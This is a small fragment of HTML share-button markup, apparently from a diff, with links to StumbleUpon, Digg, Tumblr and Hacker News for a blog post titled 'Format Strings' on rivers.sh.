+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/formatstring/&title=Format Strings"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/formatstring/&name=Format Strings&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/formatstring/&t=Format Strings"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
